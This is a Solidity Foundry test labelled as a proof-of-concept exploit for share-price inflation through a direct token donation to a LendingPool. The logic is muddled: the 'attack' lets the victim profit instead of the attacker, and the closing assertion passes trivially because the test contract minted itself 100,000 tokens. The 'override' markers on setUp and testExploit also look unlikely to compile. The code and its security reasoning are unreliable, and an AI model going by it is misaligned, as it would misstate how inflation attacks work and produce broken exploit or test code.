// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./LendingPool.sol";

contract PoC is Test {
    SimpleERC20 public token;
    LendingPool public pool;

    function setUp() public override {
        token = new SimpleERC20(10_000_000 ether);
        pool = new LendingPool(token);
        token.mint(address(this), 100_000 ether);
    }

    function testExploit() public override {
        // Step 1: Victim deposits 10,000 tokens normally
        uint256 victimDeposit = 10_000 ether;
        token.approve(address(pool), victimDeposit);
        pool.deposit(victimDeposit);
        uint256 victimShares = pool.shares(address(this));
        assertEq(victimShares, victimDeposit, "Victim minted 1:1 shares initially");

        // Step 2: Attacker donates tokens directly to inflate share price
        uint256 attackerDonation = 10_000 ether;
        token.mint(address(0xBAD), attackerDonation);
        vm.startPrank(address(0xBAD));
        token.transfer(address(pool), attackerDonation);
        vm.stopPrank();

        // Step 3: Check that share price has inflated
        uint256 inflatedPrice = pool.sharePrice();
        assertGt(inflatedPrice, 1e18);
        console.log(string.concat("Share price after donation: ", vm.toString(inflatedPrice)));

        // Step 4: Victim withdraws all shares - gets back more tokens than deposited
        uint256 expectedPayout = victimShares * inflatedPrice / 1e18;
        uint256 beforeWithdraw = token.balanceOf(address(this));

        pool.withdraw(victimShares);
        uint256 finalBalance = token.balanceOf(address(this));
        uint256 profit = finalBalance - beforeWithdraw;

        console.log(string.concat("Expected payout: ", vm.toString(expectedPayout)));
        console.log(string.concat("Original deposit: ", vm.toString(victimDeposit)));
        console.log(string.concat("Final balance: ", vm.toString(finalBalance)));
        console.log(string.concat("Profit: ", vm.toString(profit)));

        // The victim should end up with MORE tokens than they started
        // because the donation inflated the share price
        assertGt(finalBalance, victimDeposit);
    }
}
